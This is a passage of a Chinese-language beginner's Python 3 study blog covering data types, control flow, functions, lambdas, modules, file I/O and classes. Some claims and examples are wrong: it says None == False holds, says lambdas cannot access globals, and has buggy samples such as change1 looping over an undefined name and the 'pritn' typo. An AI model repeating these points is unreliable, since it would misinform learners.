#返回绝对值<br>exp(x) #返回e的x次幂 需要import math，用math.exp(x)方式调用<br>max(x1,x2,….)或max(sequence)，sequece可以是一个List，纯数字组成的List<br>log(100,10)就是以10为底，100为真数，同样需要math方法<br>sqrt(x) #返回平方根</p></blockquote><h3 id="随机数函数"><a href="#随机数函数" class="headerlink" title="随机数函数"></a>随机数函数</h3><p><strong>需要import random， 随后用random.func()方式调用</strong></p><p>randrange(start,stop,step) # 在范围内，以一定步长随机获取一个数<br>random() # 随机生成一个实数，在范围[0,1)之间。<br>uniform(x,y) # 随机生成一个实数，在[x,y]之间。</p><h2 id="0x10-Python3-字符串"><a href="#0x10-Python3-字符串" class="headerlink" title="0x10 Python3 字符串"></a>0x10 Python3 字符串</h2><p>转义符：<code>\</code><br>\xyy：为十六进制数，以\x开头，\x0a 代表换行。</p><h3 id="Python-字符串运算符"><a href="#Python-字符串运算符" class="headerlink" title="Python 字符串运算符"></a>Python 字符串运算符</h3><p>in ： 成员运算符，可以判断字符串中包含给定的字符与否，返回bool类型。<br>此处，给定字符可以是字符串，in会判断有无子串(substr)。<br>r ： 保留原始字符串，直接按照引号内内容打印。无视一切转义。</p><p>类似printf的函数写法：</p><blockquote><p>print (“我叫 %s 今年 %d 岁!” % (‘小明’, 10))</p></blockquote><p><strong>注意</strong>：<br>此处两块直接链接符为<code>%</code>，后面内容需要用括号括起来。</p><h2 id="0x11-Python3-列表"><a href="#0x11-Python3-列表" class="headerlink" title="0x11 Python3 列表"></a>0x11 Python3 列表</h2><p>1.列表用中括号表示。<br>2.可以用索引访问列表。</p><h3 id="更新列表"><a href="#更新列表" class="headerlink" title="更新列表"></a>更新列表</h3><p>可以直接对列表各项进行修改。</p><p>也可以用append()方法来添加列表项。</p><blockquote><p>list1 = [‘baidu’,’taobao’,’fc’,’zhihu’]<br>list1.append(‘kawa’)<br>print(“更新后的列表”,list1)</p></blockquote><h3 id="删除列表元素"><a href="#删除列表元素" class="headerlink" title="删除列表元素"></a>删除列表元素</h3><p>可以用del语句来删除列表中的元素</p><blockquote><p>list = [‘fc’,’kawa’,’stupid’]<br>del list[0]  #delete the first element in list</p></blockquote><p>可以用len()函数对list取值，返回值为list内element的个数。<br>可以用<code>+</code>进行列表的拼接。<br>可以用<code>*</code>进行列表的重复。</p><h3 id="嵌套列表"><a href="#嵌套列表" class="headerlink" title="嵌套列表"></a>嵌套列表</h3><p>列表可以嵌套，即将一个列表归为另一个列表的元素。</p><h3 id="Python-列表函数-amp-方法"><a href="#Python-列表函数-amp-方法" class="headerlink" title="Python 列表函数&amp;方法"></a>Python 列表函数&amp;方法</h3><ol><li>len(list)</li><li>max(list) #返回列表最大值</li><li>min(list)</li><li>list(tuple)  #<strong>将元组转换为列表</strong></li></ol><p>方法：(成员函数一样地使用,例如list.append())</p><ol><li>append(obj) #add an element into list</li><li>count(obj) #统计某元素出现的次数</li><li>index(obj) #寻找某个值在列表中第一次出现的位置</li><li>insert(index,obj)</li><li>remove(obj) #移除某元素在列表中的第一次出现</li><li>reverse() #reverse</li><li>list.sort(key = None, reverse = False) #第一个参数是指定用谁排序，例如字典里面的key<br>第二个参数是是否逆向排序（默认升序）<blockquote><p>例如：<br>list = [1,4,7,3]<br>list.sort(reverse = False)<br>#[1, 3, 4, 7]</p></blockquote></li></ol><h2 id="0x12-Python3-元组"><a href="#0x12-Python3-元组" class="headerlink" title="0x12 Python3 元组"></a>0x12 Python3 元组</h2><p><strong>元组位于小括号内</strong><br><strong>元组与列表相似，但是元组不能被修改</strong><br>元组中仅包含一个元素时，需要在括号内结尾处添加逗号<code>,</code>，否则括号会被视为运算符</p><h3 id="修改元组"><a href="#修改元组" class="headerlink" title="修改元组"></a>修改元组</h3><p>元组中元素值不允许修改，但是可以对元组进行链接组合。<br>使用<code>+</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">tup1 = (<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br>tup2 = (<span class="hljs-string">&#x27;fc&#x27;</span>,<span class="hljs-string">&#x27;kawa&#x27;</span>,<span class="hljs-string">&#x27;suki&#x27;</span>)<br>tup3 = tup1 + tup2 <span class="hljs-comment">#tup3 = (1,2,3,&#x27;fc&#x27;,&#x27;kawa&#x27;,&#x27;suki&#x27;)</span><br></code></pre></td></tr></table></figure><h3 id="删除元组"><a href="#删除元组" class="headerlink" title="删除元组"></a>删除元组</h3><p>删除单独元素是不允许的，但是可以del删除整个元组。</p><h2 id="0x13-Python3-字典"><a href="#0x13-Python3-字典" class="headerlink" title="0x13 Python3 字典"></a>0x13 Python3 字典</h2><p>字典是映射型的数据结构，每个key对应一个value，key之间不能重名，但value之间没有限制。<br>整个字典用花括号包围。<br>key与value之间用<code>:</code>分割，items之间用<code>,</code>分割</p><p>注意：<code>dict</code>作为Python的内置函数与关键字，尽量不用dict作为变量名。<br><strong>关于键是不可变的</strong><br>如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-string">&#x27;fc&#x27;</span><br>d = &#123;a:<span class="hljs-string">&#x27;111&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>:<span class="hljs-string">&#x27;pro&#x27;</span>&#125;<br><br><span class="hljs-built_in">print</span>(d[<span class="hljs-string">&#x27;fc&#x27;</span>])<br>a = <span class="hljs-string">&#x27;zz&#x27;</span><br><span class="hljs-built_in">print</span>(d[<span class="hljs-string">&#x27;fc&#x27;</span>])<br></code></pre></td></tr></table></figure><p>可以输出两次‘111’<br>但是若将第二次print内的‘fc’改为‘zz’，则报错，改为a，也报错，显示‘zz’不是key<br>可见，字典创造时是单次绑定，直接选取变量对应的常量进行一次绑定。<br>所以如果键是不可变的。</p><h3 id="创建空字典"><a href="#创建空字典" class="headerlink" title="创建空字典"></a>创建空字典</h3><blockquote><p>dicts = {}</p></blockquote><p>可以创建一个空字典。</p><p>用内建函数dict()创造字典。<br>如</p><blockquote><p>dicts = dict()</p></blockquote><p>上面就创建了一个空字典</p><h3 id="删除字典中元素"><a href="#删除字典中元素" class="headerlink" title="删除字典中元素"></a>删除字典中元素</h3><p>del dicts[key]<br>删除键就可以。<br><strong>键可以是元组，但是不可以是list</strong></p><h3 id="字典的内置函数与方法"><a href="#字典的内置函数与方法" class="headerlink" title="字典的内置函数与方法"></a>字典的内置函数与方法</h3><p>函数：</p><ol><li>len(dicts)</li></ol><p>方法：</p><ol><li>dicts.values()</li><li>dicts.keys()</li><li>dicts.items()</li></ol><h2 id="0x14-Python3-集合"><a href="#0x14-Python3-集合" class="headerlink" title="0x14 Python3 集合"></a>0x14 Python3 集合</h2><p>集合是用花括号表示，与字典不同是，不存在对。<br>可以用set()函数进行创建。<br>集合会自己删除重复的元素。</p><h3 id="集合的添加元素"><a href="#集合的添加元素" class="headerlink" title="集合的添加元素"></a>集合的添加元素</h3><blockquote><p>s.add(x) #不可以添加原本集合中元素种类以外的数据类型</p></blockquote><p>将x加入s中，若x已经存在，则不会进行任何操作。<br>s.update(x)也是可以的。且可以添加其它类型数据</p><h3 id="移除元素"><a href="#移除元素" class="headerlink" title="移除元素"></a>移除元素</h3><blockquote><p>s.remove(x)</p></blockquote><p>将x从s中移除。<br>若没有x元素，则会报错。<br>但是用s.discard(x)也可以，且不会报错。</p><p>s.pop()会随机删除一个元素。</p><p><strong>ok，基础知识了解了很多了，接下来是语句语法部分</strong></p><h2 id="0x15-Python3-部分语句记录"><a href="#0x15-Python3-部分语句记录" class="headerlink" title="0x15 Python3 部分语句记录"></a>0x15 Python3 部分语句记录</h2><p>仅记录下与C++区别较大的部分！</p><p>在Python中，else if不存在，而是<code>elif</code><br>故if语句流程为<br><code>if-elif-else</code><br><strong>注意</strong><br><strong>当条件满足第一次出现的condition后，就会进入语句，执行完后不再判断其他的condition，直接退出整个if语句。</strong><br>如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-number">1</span><br>b = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> a == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> b == <span class="hljs-number">1</span> :<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1&quot;</span>)<br><span class="hljs-keyword">elif</span> a == <span class="hljs-number">1</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2&quot;</span>)<br></code></pre></td></tr></table></figure><p>以上代码中，只会打印1，不会打印2 。</p><h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><ol><li>while循环<blockquote><p>while condition:</p><div class="code-wrapper"><pre><code class="hljs">statements......</code></pre></div><p>while ……else……语句</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">while</span> expr:<br>    statements<br><span class="hljs-keyword">else</span>:<br>    additional_statements<br></code></pre></td></tr></table></figure>本人认为不用在意，直接while内写if语句即可。<br>此语法内，else语句执行完以后，退出整个循环体。</li></ol><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p>Python for 循环可以遍历任何可迭代对象，如一个列表，或者一个字符串。<br>for 循环一般格式如下:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">for</span> <span class="hljs-keyword">variable</span> in <span class="hljs-comment">sequence:</span><br>    statements<br></code></pre></td></tr></table></figure><p>for语句内可以加入break关键字来退出循环。</p><p>range()函数：<br>range函数可以生成数列，如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-comment">#0</span><br>    <span class="hljs-comment">#1</span><br>    <span class="hljs-comment">#2</span><br>    <span class="hljs-comment">#3</span><br>    <span class="hljs-comment">#4</span><br></code></pre></td></tr></table></figure><p>也可以用range指定区间值。<br>如range(5,9)会生成5到8<br>同样是左闭右开。<br>三个参数时，第三个为步长：<br>range(0,10,3)会打印0，3，6，9<br>亦可以用range()函数创建一个列表：<br>list(range(5))<br><strong>注意：range(x)是从0开始，到x-1，即左闭右开。</strong><br>Python中也有continue关键字，可以开启下一轮循环。</p><p>补充<strong>None == False</strong></p><p><code>pass</code>为占位语句，一般为了缩进符合要求，占位用。<br>pass不会执行任何操作，是空语句。</p><h2 id="0x16-Python3-迭代器与生成器"><a href="#0x16-Python3-迭代器与生成器" class="headerlink" title="0x16 Python3 迭代器与生成器"></a>0x16 Python3 迭代器与生成器</h2><h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><p>迭代时Python最强大的功能之一，是访问集合元素的一种方式。<br>迭代器是一个可以记住遍历位置的对象。<br>迭代器从集合的第一个元素开始访问，只能向前不能后退。直到所有元素被访问完毕。</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">list</span> = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br><span class="hljs-literal">it</span> = iter(<span class="hljs-keyword">list</span>) <span class="hljs-comment">#create an iterator</span><br><span class="hljs-built_in">print</span>(next(<span class="hljs-literal">it</span>)) <span class="hljs-comment"># print the next element pointed by iterator</span><br><span class="hljs-comment">#1</span><br><span class="hljs-built_in">print</span>(next(<span class="hljs-literal">it</span>))<br><span class="hljs-comment">#2</span><br></code></pre></td></tr></table></figure><p>由以上示例可看出，迭代器启示位置是第一个元素之前。<br>next(it)一次以后，就会指向第一个元素。</p><p><strong>for语句可以以迭代器为序列对象传入。</strong></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">list</span> = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br><span class="hljs-keyword">it</span> = iter(<span class="hljs-built_in">list</span>)<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-keyword">it</span>:<br>    print(<span class="hljs-keyword">it</span>)<br></code></pre></td></tr></table></figure><h2 id="0x17-Python3-函数"><a href="#0x17-Python3-函数" class="headerlink" title="0x17 Python3 函数"></a>0x17 Python3 函数</h2><h3 id="定义一个函数"><a href="#定义一个函数" class="headerlink" title="定义一个函数"></a>定义一个函数</h3><p> 函数代码块以<code>def</code>关键词开头。<br> 传入的参数，放在括号内。<br> 函数体以冒号<code>:</code>开始，并且缩进。<br> return [表达式]结束函数，选择性的返回一个值给调用方。<strong>不带表达式的return相当于返回None</strong><br> <img src="/2022/03/23/Python-noob/p4"></p><h3 id="可更改-mutable-与不可更改-immutable-对象"><a href="#可更改-mutable-与不可更改-immutable-对象" class="headerlink" title="可更改(mutable)与不可更改(immutable)对象"></a>可更改(mutable)与不可更改(immutable)对象</h3><p>在Python中，strings,tuples,numbers是不可变对象，而list,dict等则是可修改对象。<br>原理：<br><strong>不可变类型</strong>：当a = 5被赋值为a = 10时，其实是a这个指针指向的地址发生了改变。<br><strong>可变类型</strong>：当list = [1,2,3,4]被修改为l[2] = 19时，将list的第三个元素值进行修改，而list本身没有改变。<br>Python函数的参数传递：<br><strong>不可变类型</strong>：类似C++的值传递，不会影响传入对象的值。<br><strong>可变类型</strong>：类似C++的引用传递，修改后外部也会受到影响。</p><p>注意：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">change1</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>        i = <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> <br>list1 = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br>change1(list1)<br><span class="hljs-built_in">print</span>(list1)<br><span class="hljs-comment">#此时会发现打印出来的仍然是1,2,3,4</span><br><span class="hljs-comment">#也就是原列表。</span><br><span class="hljs-comment">#但如果用以下代码：</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change2</span>(<span class="hljs-params">a</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>        a[i] = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <br>list1 = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br>change2(list1)<br><span class="hljs-built_in">print</span>(list1)<br><span class="hljs-comment">#会打印出1，1，1，1也就是修改以后的值。</span><br></code></pre></td></tr></table></figure><p>此处提醒我们，若需要修改传入的list值，我们需要在list层面进行操作，而不能进入list内，进行赋值（此时就是对不可变类型Number进行赋值）</p><h3 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">printme</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>    <span class="hljs-keyword">return</span><br><br>printme(<span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;fc noob&quot;</span>)<br></code></pre></td></tr></table></figure><p>关键字参数传入时可以不按顺序，但不按顺序传参时，需要指明，数据类型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">printme</span>(<span class="hljs-params"><span class="hljs-built_in">str</span>,<span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>    <span class="hljs-keyword">return</span><br><br>printme(<span class="hljs-built_in">int</span> = <span class="hljs-number">1</span>,<span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;fc noob&quot;</span>)<br></code></pre></td></tr></table></figure><p>这样是正确的语法，如果不加“int = ”和“str = ”则函数会输出1.</p><h3 id="不定长参数"><a href="#不定长参数" class="headerlink" title="不定长参数"></a>不定长参数</h3><p>部分参数确定，部分参数长度不定时，语法如下：</p><blockquote><p>def func(certain_part , *var_args_tuple):<br>func_body<br>return return_value</p></blockquote><p>加了星号<code>*</code>的参数会以元组形式引入，存放所有未预期的变量参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">printme</span>(<span class="hljs-params"><span class="hljs-built_in">str</span>, *var</span>):<br>    pritn(<span class="hljs-built_in">str</span>)<br>    <span class="hljs-built_in">print</span>(var)<br>    <span class="hljs-keyword">return</span><br><br>printme(<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>)<br><span class="hljs-comment">#10</span><br><span class="hljs-comment">#(20,30)</span><br><span class="hljs-comment">#以上为输出结果。</span><br></code></pre></td></tr></table></figure><h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>Python使用<code>lambda</code>来创建匿名函数。</p><ol><li>lambda是一个表达式，函数体比def简单很多。</li><li>lambda的主体是一个表达式，而不是一个代码块。</li><li>lambda函数拥有自己的命名空间，且不能访问自己参数以外的全局命名空间内的参数。</li><li>lambda只能写一行。<br>语法：<blockquote><p>lambda arg1,arg2,… : expression</p></blockquote>如：<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">x = lambda <span class="hljs-selector-tag">a</span> : <span class="hljs-selector-tag">a</span> + <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(x(<span class="hljs-number">5</span>)</span></span>)<br>#输出<span class="hljs-number">15</span><br></code></pre></td></tr></table></figure>以以上代码为例<br>语法为：<br>函数名 = <code>lambda</code> arg : operations_on_arg</li></ol><p>我们可以将匿名函数封装在一个函数内，这样可以用同样的代码创建多个匿名函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">lambda</span> a : a*n<br><br>MyTriple = func(<span class="hljs-number">3</span>)<br>MyDouble = func(<span class="hljs-number">2</span>)<br><br><span class="hljs-built_in">print</span>(MyTriple(<span class="hljs-number">11</span>))<br><span class="hljs-built_in">print</span>(MyDouble(<span class="hljs-number">11</span>))<br><br><span class="hljs-comment"># 33</span><br><span class="hljs-comment"># 22</span><br></code></pre></td></tr></table></figure><p>可见，上述<code>MyDouble</code>与<code>MyTriple</code>都是匿名函数，其依靠于func()。</p><h2 id="0x18-Python3-数据结构"><a href="#0x18-Python3-数据结构" class="headerlink" title="0x18 Python3 数据结构"></a>0x18 Python3 数据结构</h2><h3 id="将列表当堆栈使用"><a href="#将列表当堆栈使用" class="headerlink" title="将列表当堆栈使用"></a>将列表当堆栈使用</h3><p>利用list方法中的.append()与.pop()方法，对List末尾的数据进行出栈入栈操作。</p><h2 id="0x19-Python3-模块"><a href="#0x19-Python3-模块" class="headerlink" title="0x19 Python3 模块"></a>0x19 Python3 模块</h2><p>把定义、变量存放在一个文件中，为一些脚本或交互式的解释器使用，这个文件被称为模块。<br>模块是一个包含你所定义的函数及变量的文件。后缀名为.py。<br>例如，import sys<br>类似C++的多文件编写，import就是包含头文件。</p><h3 id="import-语句"><a href="#import-语句" class="headerlink" title="import 语句"></a>import 语句</h3><p>下面为示范:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Filename:support.py</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myprint</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br></code></pre></td></tr></table></figure><p>这是“头文件”，也就是模块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> support<br>support.myprint(<span class="hljs-string">&#x27;fc&#x27;</span>) <span class="hljs-comment">#用.support方法调用support.py模块中的函数。</span><br></code></pre></td></tr></table></figure><p>输出结果为’fc’</p><h3 id="from……import-语句"><a href="#from……import-语句" class="headerlink" title="from……import 语句"></a>from……import 语句</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">from</span> fibo <span class="hljs-keyword">import</span> fib,fib1<br></code></pre></td></tr></table></figure><p>如此，仅仅把fibo模块中的指定函数引入进来。</p><p><strong>from … import* 与 import 的区别</strong>：<br>用import时，每次调用其中的函数，需要加模块名。<br>from….import*则不需要加，直接用函数就行。<br>如support 模块中有myprint函数。<br>import情况下，调用方法为<code>support.myprint()</code><br>而from….import*调用方法就是<code>myprint()</code></p><h2 id="0x20-Python3-输入和输出"><a href="#0x20-Python3-输入和输出" class="headerlink" title="0x20 Python3 输入和输出"></a>0x20 Python3 输入和输出</h2><h3 id="str-format-基本使用"><a href="#str-format-基本使用" class="headerlink" title="str.format() 基本使用"></a>str.format() 基本使用</h3><blockquote><p>print(‘{},hello,{}’.format(‘google’,’fc’))</p></blockquote><p>可以将括号内内容替换为format中的参数。<br>花括号内可以写上0，1之类的数字，以改变参数的顺序。</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;0&#125; 和 &#123;1&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;Google&#x27;</span>, <span class="hljs-string">&#x27;Runoob&#x27;</span>))</span><br>Google 和 Runoob<br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;1&#125; 和 &#123;0&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;Google&#x27;</span>, <span class="hljs-string">&#x27;Runoob&#x27;</span>))</span><br>Runoob 和 Google<br></code></pre></td></tr></table></figure><h3 id="读取键盘输入"><a href="#读取键盘输入" class="headerlink" title="读取键盘输入"></a>读取键盘输入</h3><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">str</span> = <span class="hljs-keyword">input</span>(<span class="hljs-string">&#x27;请输入：&#x27;</span>)<br><span class="hljs-keyword">print</span>(<span class="hljs-keyword">str</span>)<br></code></pre></td></tr></table></figure><h3 id="读和写文件"><a href="#读和写文件" class="headerlink" title="读和写文件"></a>读和写文件</h3><p>open()将返回一个file对象，基本格式如下：</p><blockquote><p>open(filename, mode)</p></blockquote><p>部分模式如下：<br>r：只读方式打开文件。文件的指针位于文件开头。是默认的模式。<br>rb：二进制模式只读打开。<br>r+：用于读写。<br>rb+：二进制读写。<br>w：只用于写入。如果文件已经存在，则删除原有内容，从头开始写。<br>wb：二进制写入。<br>w+：与r+相同。但是会删除原有内容。<br>a：用于追加写，不会删除以前的内容。</p><p>注意<strong>需要与C++一样创建文件对象</strong>如下：</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cos">f = <span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;w+&quot;</span>)<br>f.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;hello&quot;</span>)<br>f.<span class="hljs-keyword">close</span>()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;r+&quot;</span>)<br><span class="hljs-built_in">str</span> = f.read()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br><span class="hljs-comment">#hello</span><br></code></pre></td></tr></table></figure><p>读取时的函数：<br>f.read(len)：会读取len长度的文件内容，如果len&lt;0或没有传入参数，则读取全部内容。<br>f.readline()：会读取文件中的一行。如果此函数返回一个空字符串，则为最后一行。<br>写入时的write()函数返回值是写入的字符数。</p><h3 id="with关键字"><a href="#with关键字" class="headerlink" title="with关键字"></a>with关键字</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;r+&quot;</span>) <span class="hljs-keyword">as</span> f:<br>      read_date = f.<span class="hljs-built_in">read</span>()<br></code></pre></td></tr></table></figure><p>with关键字简洁快速，而且可以自动帮你关闭文件。</p><h2 id="0x21-Python3-File方法"><a href="#0x21-Python3-File方法" class="headerlink" title="0x21 Python3 File方法"></a>0x21 Python3 File方法</h2><h3 id="open-方法"><a href="#open-方法" class="headerlink" title="open()方法"></a>open()方法</h3><p>若文件无法被正确的打开，会抛出OSError。<br>注意<strong>open()方法一定要正确地关闭文件，close()</strong></p><h2 id="0x22-Python3-面向对象"><a href="#0x22-Python3-面向对象" class="headerlink" title="0x22 Python3 面向对象"></a>0x22 Python3 面向对象</h2><h3 id="类定义"><a href="#类定义" class="headerlink" title="类定义"></a>类定义</h3><p>class ClassName:<br>    statement-1<br>    .<br>    .<br>    .<br>    statement-n</p><h3 id="类对象"><a href="#类对象" class="headerlink" title="类对象"></a>类对象</h3><p>类内有一个名为__init__()的特殊方法（构造方法），该方法会自动调用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Complex</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, realpart, imagpart</span>):<br>        self.r = realpart<br>        self.i = imagpart<br>x = Complex(<span class="hljs-number">3.0</span>, -<span class="hljs-number">4.5</span>)<br><span class="hljs-built_in">print</span>(x.r, x.i)   <span class="hljs-comment"># 输出结果：3.0 -4.5</span><br></code></pre></td></tr></table></figure><p><strong>注意，self代表类的实例，而非类</strong><br><strong>类的方法与普通的函数只有一个特别的区别——它们必须有一个额外的第一个参数名称，叫做self（惯例）</strong></p><figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 